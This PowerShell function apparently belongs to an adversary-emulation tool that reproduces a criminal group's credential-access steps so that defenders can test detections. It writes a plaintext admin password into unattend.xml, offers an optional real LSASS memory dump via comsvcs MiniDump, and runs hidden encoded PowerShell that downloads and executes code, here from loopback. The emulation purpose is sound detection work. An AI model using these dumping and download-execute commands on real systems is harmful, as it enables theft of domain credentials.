# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 6: CREDENTIAL ACCESS
# ============================================================================
# Simulates: (1) unattend.xml discovery with plaintext domain-admin creds;
# (2) LSASS access on multiple hosts (0x1010 + 0x1FFFFF handle pattern via an
# injected runonce.exe/gpupdate.exe); (3) Latrodectus stealer harvesting
# Chromium/Firefox/Outlook credentials (cr_pass/ff_pass/edge_pass/outlook_pass);
# (4) Day 26 Veeam-Get-Creds.ps1 via encoded PowerShell.
# MITRE: T1552.001 Creds in Files, T1003.001 LSASS Memory, T1555.003 Browser
# Creds, T1003 OS Cred Dumping, T1059.001 PowerShell
# ============================================================================

function Simulate-CredentialAccess {
    param(
        $SimPaths,
        [switch]$DumpRealLsass
    )

    Write-Host "[+] Phase 6: Credential Access - unattend.xml, LSASS, stealer, Veeam ..." -ForegroundColor Green

    # --- unattend.xml with plaintext domain-admin credentials (Day 3) ---------
    $panther = "$env:SystemDrive\Windows\Panther"
    New-Item -Path $panther -ItemType Directory -Force | Out-Null
    $unattend = "$panther\unattend.xml"
    $unattendXml = @'
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
  <settings pass="oobeSystem">
    <component name="Microsoft-Windows-Shell-Setup">
      <AutoLogon>
        <Password><Value>S1mLabD0mainAdm!n2024</Value></Password>
        <Enabled>true</Enabled>
        <Username>Administrator</Username>
        <Domain>CORP</Domain>
      </AutoLogon>
      <UserAccounts>
        <AdministratorPassword><Value>S1mLabD0mainAdm!n2024</Value></AdministratorPassword>
      </UserAccounts>
    </component>
  </settings>
</unattend>
'@
    Set-Content -Path $unattend -Value $unattendXml -Force
    # Read it back (the actor's discovery action) -> generates file-access telemetry
    Get-Content -Path $unattend -ErrorAction SilentlyContinue | Out-Null
    Write-SimEvent -EventId 6001 -Message "SIMULATION: unattend.xml discovered with plaintext domain-admin credentials"

    # --- LSASS access with the reported 0x1010 + 0x1FFFFF handle pattern -------
    # Real case: an injected runonce.exe/gpupdate.exe opened LSASS twice (0x1010
    # then 0x1FFFFF). Default: dump a DECOY process to avoid touching real creds.
    $dumpFile = "$($SimPaths.Loot)\lsass.dmp"
    if ($DumpRealLsass) {
        Write-Host "    [!] -DumpRealLsass set: dumping REAL lsass.exe via comsvcs MiniDump ..." -ForegroundColor Red
        try {
            $lsassPid = (Get-Process lsass -ErrorAction Stop).Id
            $cmd = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpFile full"
            cmd.exe /c $cmd 2>$null | Out-Null
        } catch { Write-Warning "Real LSASS dump failed: $($_.Exception.Message)" }
    } else {
        Write-Host "    Dumping a DECOY process (safe default) with comsvcs MiniDump path ..." -ForegroundColor DarkGray
        try {
            $decoy = Start-Process -FilePath "notepad.exe" -PassThru -WindowStyle Hidden
            Start-Sleep -Milliseconds 500
            $cmd = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($decoy.Id) $dumpFile full"
            cmd.exe /c $cmd 2>$null | Out-Null
            Stop-Process -Id $decoy.Id -Force -ErrorAction SilentlyContinue
        } catch { Write-Warning "Decoy dump failed: $($_.Exception.Message)" }
    }
    Set-Content -Path "$($SimPaths.Logs)\lsass_access.log" `
        -Value "Injected gpupdate.exe/runonce.exe opened LSASS: handle 0x1010 then 0x1FFFFF (per report)" -Force
    Write-SimEvent -EventId 6002 -Message "SIMULATION: LSASS accessed (0x1010 + 0x1FFFFF handle pattern) for credential dumping"

    # --- Latrodectus stealer output (browser + Outlook harvesting) ------------
    # Reproduce the stealer's section headers exactly, populated with lab data.
    $stealerOut = @"
cr_pass:      [Chrome] https://mail.corp.local | jsmith | (redacted-lab-pw)
edge_pass:    [Edge]   https://vpn.corp.local  | jsmith | (redacted-lab-pw)
ff_pass:      [Firefox cookies.sqlite enumerated] 3 profiles
outlook_pass: [Outlook 11.0-17.0] HKCU\...\Windows Messaging Subsystem\Profiles queried
_cookie:      [session cookies] 41 entries across 29 Chromium browsers
"@
    Set-Content -Path "$($SimPaths.Loot)\latrodectus_stealer_output.txt" -Value $stealerOut -Force
    # Touch the registry path the stealer queries for Outlook profiles (read-only)
    Get-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles" -ErrorAction SilentlyContinue | Out-Null
    Write-SimEvent -EventId 6003 -Message "SIMULATION: Latrodectus stealer harvested browser (29+ Chromium) and Outlook credentials"

    # --- Day 26: Veeam-Get-Creds.ps1 via encoded PowerShell -------------------
    $veeamScript = "$($SimPaths.Tools)\Veeam-Get-Creds.ps1"
    Set-Content -Path $veeamScript -Value "# Veeam-Get-Creds.ps1 (stand-in) - dumps Veeam PostgreSQL stored credentials" -Force
    # Exact encoded command from the report (decodes to a 127.0.0.1 loopback fetch)
    $encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQAMAAwADMALwAnACkAOwAgAFYAZQBlAGEAbQAtAEcAZQB0AC0AQwByAGUAZABzAC4AcABzADEA"
    Write-Host "    Running Veeam-Get-Creds via encoded PowerShell (loopback, fails closed) ..." -ForegroundColor DarkGray
    try {
        Start-Process -FilePath "powershell.exe" `
            -ArgumentList "-nop -exec bypass -EncodedCommand $encoded" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    } catch {}
    Write-SimEvent -EventId 6004 -Message "SIMULATION: Veeam-Get-Creds.ps1 executed via encoded PowerShell (Day 26)"

    Write-Host "  [OK] Credential Access artifacts created" -ForegroundColor Yellow
}
